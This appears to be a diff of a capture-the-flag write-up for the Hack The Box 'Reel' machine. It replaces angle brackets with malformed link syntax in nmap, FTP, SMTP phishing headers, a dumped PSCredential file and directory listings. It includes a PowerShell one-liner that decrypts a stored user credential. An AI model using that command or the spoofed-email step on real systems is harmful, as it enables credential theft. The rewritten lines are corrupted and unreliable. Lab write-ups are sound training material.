@@ -20,7 +20,7 @@ Let's Begin with our Initial Nmap Scan.
 PORT      STATE SERVICE      VERSION
 21/tcp    open  ftp          Microsoft ftpd
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_05-29-18  12:19AM       <DIR>          documents
+|_05-29-18  12:19AM       [DIR](DIR)          documents
 | ftp-syst: 
 |_  SYST: Windows_NT
 22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
@@ -118,7 +118,7 @@ Host script results:
 |   FQDN: REEL.HTB.LOCAL
 |_  System time: 2020-08-25T14:20:18+01:00
 | smb-security-mode: 
-|   account_used: <blank>
+|   account_used: [blank](blank)
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: required
@@ -151,7 +151,7 @@ Remote system type is Windows_NT.
 ftp> ls
 200 PORT command successful.
 125 Data connection already open; Transfer starting.
-05-29-18  12:19AM       <DIR>          documents
+05-29-18  12:19AM       [DIR](DIR)          documents
 226 Transfer complete.
 ftp> cd documents
 250 CWD command successful.
@@ -287,9 +287,9 @@ root@kali:~/CTF/HTB/Boxes/Reel/CVE-2017-0199# swaks --server 10.10.10.77 --from 
 <-  250-SIZE 20480000
 <-  250-AUTH LOGIN PLAIN
 <-  250 HELP
- -> MAIL FROM:<wolf@megabank.com>
+ -> MAIL FROM:[wolf@megabank.com](wolf@megabank.com)
 <-  250 OK
- -> RCPT TO:<nico@megabank.com>
+ -> RCPT TO:[nico@megabank.com](nico@megabank.com)
 <-  250 OK
  -> DATA
 <-  354 OK, send.
@@ -297,7 +297,7 @@ root@kali:~/CTF/HTB/Boxes/Reel/CVE-2017-0199# swaks --server 10.10.10.77 --from 
  -> To: nico@megabank.com
  -> From: wolf@megabank.com
  -> Subject:Please Review this
- -> Message-Id: <20200811214134.007039@kali>
+ -> Message-Id: [20200811214134.007039@kali](20200811214134.007039@kali)
  -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
  -> MIME-Version: 1.0
  -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_7039"
@@ -346,8 +346,8 @@ When I got through the files and Found encrypted password of user `tom` and they
 ```bash
 Directory of C:\Users\nico\Desktop
 
-28/05/2018  21:07    <DIR>          .
-28/05/2018  21:07    <DIR>          ..
+28/05/2018  21:07    [DIR](DIR)          .
+28/05/2018  21:07    [DIR](DIR)          ..
 28/10/2017  00:59             1,468 cred.xml
 28/10/2017  00:40                32 user.txt
                2 File(s)          1,500 bytes
@@ -355,26 +355,26 @@ Directory of C:\Users\nico\Desktop
 
 C:\Users\nico\Desktop>type cred.xml
 type cred.xml
-<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
-  <Obj RefId="0">
-    <TN RefId="0">
-      <T>System.Management.Automation.PSCredential</T>
-      <T>System.Object</T>
-    </TN>
-    <ToString>System.Management.Automation.PSCredential</ToString>
-    <Props>
-      <S N="UserName">HTB\Tom</S>
-      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
-    </Props>
-  </Obj>
-</Objs>
+[Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"](Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04")
+  [Obj RefId="0"](Obj RefId="0")
+    [TN RefId="0"](TN RefId="0")
+      [T](T)System.Management.Automation.PSCredential[/T](/T)
+      [T](T)System.Object[/T](/T)
+    [/TN](/TN)
+    [ToString](ToString)System.Management.Automation.PSCredential[/ToString](/ToString)
+    [Props](Props)
+      [S N="UserName"](S N="UserName")HTB\Tom[/S](/S)
+      [SS N="Password"](SS N="Password")01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692[/SS](/SS)
+    [/Props](/Props)
+  [/Obj](/Obj)
+[/Objs](/Objs)
 ```
 
 Reference:
 
 - [https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx)
 
-I googled about how to decrypt it and found this link and `$cred=Import-CliXml -Path <file>; $cred.GetNetworkCredential().Password` this is the command which helps to decrypt.
+I googled about how to decrypt it and found this link and `$cred=Import-CliXml -Path [file](file); $cred.GetNetworkCredential().Password` this is the command which helps to decrypt.
 
 ```bash
 C:\Users\nico\Desktop>powershell.exe -c "$cred=Import-CliXml -Path C:\Users\nico\Desktop\cred.xml; $cred.GetNetworkCredential().Password"
@@ -494,22 +494,22 @@ claire@REEL C:\Users\Administrator>dir
 
  Directory of C:\Users\Administrator                                                                                            
 
-02/17/2018  12:29 AM    <DIR>          .                                                                                        
-02/17/2018  12:29 AM    <DIR>          ..                                                                                       
-10/28/2017  12:14 AM    <DIR>          .config                                                                                  
-10/28/2017  12:28 AM    <DIR>          .oracle_jre_usage                                                                        
-10/28/2017  12:00 AM    <DIR>          Contacts                                                                                 
-01/21/2018  03:56 PM    <DIR>          Desktop                                                                                  
-05/29/2018  10:19 PM    <DIR>          Documents                                                                                
-02/17/2018  12:29 AM    <DIR>          Downloads                                                                                
-10/28/2017  12:00 AM    <DIR>          Favorites                                                                                
-10/28/2017  12:00 AM    <DIR>          Links                                                                                    
-10/28/2017  12:00 AM    <DIR>          Music                                                                                    
-10/26/2017  09:20 PM    <DIR>          OneDrive                                                                                 
-10/31/2017  10:38 PM    <DIR>          Pictures                                                                                 
-10/28/2017  12:00 AM    <DIR>          Saved Games                                                                              
-10/28/2017  12:00 AM    <DIR>          Searches                                                                                 
-10/28/2017  12:00 AM    <DIR>          Videos                                                                                   
+02/17/2018  12:29 AM    [DIR](DIR)          .                                                                                        
+02/17/2018  12:29 AM    [DIR](DIR)          ..                                                                                       
+10/28/2017  12:14 AM    [DIR](DIR)          .config                                                                                  
+10/28/2017  12:28 AM    [DIR](DIR)          .oracle_jre_usage                                                                        
+10/28/2017  12:00 AM    [DIR](DIR)          Contacts                                                                                 
+01/21/2018  03:56 PM    [DIR](DIR)          Desktop                                                                                  
+05/29/2018  10:19 PM    [DIR](DIR)          Documents                                                                                
+02/17/2018  12:29 AM    [DIR](DIR)          Downloads                                                                                
+10/28/2017  12:00 AM    [DIR](DIR)          Favorites                                                                                
+10/28/2017  12:00 AM    [DIR](DIR)          Links                                                                                    
+10/28/2017  12:00 AM    [DIR](DIR)          Music                                                                                    
+10/26/2017  09:20 PM    [DIR](DIR)          OneDrive                                                                                 
+10/31/2017  10:38 PM    [DIR](DIR)          Pictures                                                                                 
+10/28/2017  12:00 AM    [DIR](DIR)          Saved Games                                                                              
+10/28/2017  12:00 AM    [DIR](DIR)          Searches                                                                                 
+10/28/2017  12:00 AM    [DIR](DIR)          Videos                                                                                   
                0 File(s)              0 bytes                                                                                   
               16 Dir(s)  15,761,108,992 bytes free
 ```
@@ -523,8 +523,8 @@ claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir
 
  Directory of C:\Users\Administrator\Desktop\Backup Scripts                                                                     
 
-11/02/2017  10:47 PM    <DIR>          .                                                                                        
-11/02/2017  10:47 PM    <DIR>          ..                                                                                       
+11/02/2017  10:47 PM    [DIR](DIR)          .                                                                                        
+11/02/2017  10:47 PM    [DIR](DIR)          ..                                                                                       
 11/04/2017  12:22 AM               845 backup.ps1                                                                               
 11/02/2017  10:37 PM               462 backup1.ps1                                                                              
 11/04/2017  12:21 AM             5,642 BackupScript.ps1                                                                         
